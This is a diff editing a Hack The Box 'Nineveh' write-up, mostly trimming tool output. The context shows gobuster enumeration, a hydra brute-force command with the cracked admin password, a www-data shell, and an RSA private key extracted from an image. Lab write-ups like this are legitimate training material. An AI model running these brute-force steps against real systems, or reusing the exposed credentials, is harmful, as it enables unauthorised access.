@@ -61,49 +61,17 @@ Lets run `gobuster` on both the `http` and `https` website!
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
 └─# gobuster dir -u http://10.10.10.43 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k 
-===============================================================
-Gobuster v3.1.0
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://10.10.10.43
-[+] Method:                  GET
-[+] Threads:                 50
-[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.1.0
-[+] Timeout:                 10s
-===============================================================
-2022/06/28 20:33:30 Starting gobuster in directory enumeration mode
-===============================================================
+...
 /department           (Status: 301) [Size: 315] [--> http://10.10.10.43/department/]
-/server-status        (Status: 403) [Size: 299]                                                                                    
-===============================================================
-2022/06/28 20:34:06 Finished
-===============================================================
+/server-status        (Status: 403) [Size: 299]                           ...
 
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
 └─# gobuster dir -u https://10.10.10.43 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k 
-===============================================================
-Gobuster v3.1.0
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     https://10.10.10.43
-[+] Method:                  GET
-[+] Threads:                 50
-[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.1.0
-[+] Timeout:                 10s
-===============================================================
-2022/06/28 20:34:21 Starting gobuster in directory enumeration mode
-===============================================================
+...
 /db                   (Status: 301) [Size: 309] [--> https://10.10.10.43/db/]
 /server-status        (Status: 403) [Size: 300]                              
 /secure_notes         (Status: 301) [Size: 319] [--> https://10.10.10.43/secure_notes/]
-              
-===============================================================
-2022/06/28 20:34:59 Finished
-===============================================================
+...
 ```
 
 Lets check out the `/department` webpage for their `http` site.
@@ -121,7 +89,7 @@ This shows that `admin` is indeed a username in their database. So lets use `hyd
 └─# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 -s 80 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 
 ...
 [80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
-1 of 1 target successfully completed, 1 valid password found
+...
 ```
 
 >   Refer to this [article](https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/) on how to use `hydra` to brute force websites & online forms.
@@ -299,22 +267,26 @@ login.php
 logout.php
 manage.php
 underconstruction.jpg
+
 www-data@nineveh:/var/www/html/department$ cd ../
 www-data@nineveh:/var/www/html$ ls
 department
 index.html
 info.php
 ninevehdestruction.jpg
+
 www-data@nineveh:/var/www/html$ cd ../
 www-data@nineveh:/var/www$ ls
 html
 ssl
+
 www-data@nineveh:/var/www$ cd ssl
 www-data@nineveh:/var/www/ssl$ ls
 db
 index.html
 ninevehForAll.png
 secure_notes
+
 www-data@nineveh:/var/www/ssl$ cd secure_notes 
 www-data@nineveh:/var/www/ssl/secure_notes$ ls
 index.html
@@ -355,17 +327,17 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
 └─# ls
 nineveh.png  _nineveh.png.extracted
-                                                                                                                      
+                                   
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
 └─# cd _nineveh.png.extracted 
-                                                                                                                      
+                                   
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh/_nineveh.png.extracted]
 └─# ls
 2BF8D0.tar  54  54.zlib  secret
-                                                                                                                      
+                               
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh/_nineveh.png.extracted]
 └─# cd secret                
-                                                                                                                      
+                              
 ┌──(root㉿shiro)-[/home/…/HackTheBox/Nineveh/_nineveh.png.extracted/secret]
 └─# ls
 nineveh.priv  nineveh.pub
@@ -398,8 +370,7 @@ PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
 i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
 il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
 fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
------END RSA PRIVATE KEY-----
-                                                                                                                      
+-----END RSA PRIVATE KEY-----                                                                                                             
 ┌──(root㉿shiro)-[/home/…/HackTheBox/Nineveh/_nineveh.png.extracted/secret]
 └─# cat nineveh.pub 
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
